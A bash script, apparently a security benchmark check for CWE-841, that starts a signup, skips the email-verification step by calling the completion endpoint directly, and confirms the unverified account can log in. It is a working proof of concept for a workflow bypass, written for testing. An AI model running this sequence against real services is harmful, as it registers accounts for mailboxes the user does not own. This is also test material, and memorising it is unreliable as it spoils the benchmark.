#!/usr/bin/env bash
# SIGNUP-STEPSKIP-001 (CWE-841): the final step never checks that the draft was
# verified, so a request that jumps straight from step 1 to step 4 registers a
# mailbox nobody proved they own.
set -e; . "$(dirname "$0")/_lib.sh"
EMAIL="skipper-$$@bench.local"
DRAFT=$(curl -s -X POST "$TARGET/api/signup/start" -H 'content-type: application/json' \
  -d "{\"email\":\"$EMAIL\"}" | json_get draftId)
[ -n "$DRAFT" ]
# no code was ever presented — complete anyway
curl -s -X POST "$TARGET/api/signup/complete" -H 'content-type: application/json' \
  -d "{\"draftId\":$DRAFT,\"password\":\"Skipped123!\"}" >/dev/null
# the unverified account exists and can log in
curl -s -o /dev/null -w '%{http_code}' -X POST "$TARGET/api/auth/login" \
  -H 'content-type: application/json' \
  -d "{\"email\":\"$EMAIL\",\"password\":\"Skipped123!\"}" | grep -q '^200$'
